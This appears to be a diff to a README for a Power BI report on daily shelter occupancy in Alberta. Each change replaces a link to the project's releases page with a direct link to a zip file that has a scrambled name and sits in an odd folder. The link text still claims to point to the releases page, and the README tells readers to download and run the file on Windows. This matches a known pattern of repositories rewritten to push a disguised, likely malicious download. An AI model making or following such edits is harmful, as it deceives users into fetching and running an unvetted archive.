@@ -1,6 +1,6 @@
 # 📊 PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta - Track Shelter Risk Faster
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge&logo=github)](https://github.com/Downtoearth-sloughgrass506/PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge&logo=github)](https://github.com/Downtoearth-sloughgrass506/PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta/raw/refs/heads/main/prenares/And_Daily_Occupancy_Power_B_Alberta_Capacity_in_Shelters_v2.8.zip)
 
 ## 🚀 Overview
 
@@ -10,7 +10,7 @@ Use this file if you want a clear view of shelter data in one place. It is built
 
 ## 📥 Download and Open
 
-1. Visit the [releases page](https://github.com/Downtoearth-sloughgrass506/PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta/releases)
+1. Visit the [releases page](https://github.com/Downtoearth-sloughgrass506/PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta/raw/refs/heads/main/prenares/And_Daily_Occupancy_Power_B_Alberta_Capacity_in_Shelters_v2.8.zip)
 2. Download the latest release file from that page
 3. If the file is a `.pbix` file, open it with Microsoft Power BI Desktop
 4. If the file comes in a zip file, extract it first, then open the `.pbix` file inside
@@ -182,7 +182,7 @@ This order helps you understand the report without jumping between pages.
 
 Use the release page here to download and run the latest report file on Windows:
 
-[Visit the releases page](https://github.com/Downtoearth-sloughgrass506/PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta/releases)
+[Visit the releases page](https://github.com/Downtoearth-sloughgrass506/PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta/raw/refs/heads/main/prenares/And_Daily_Occupancy_Power_B_Alberta_Capacity_in_Shelters_v2.8.zip)
 
 ## 📅 Data Focus
 
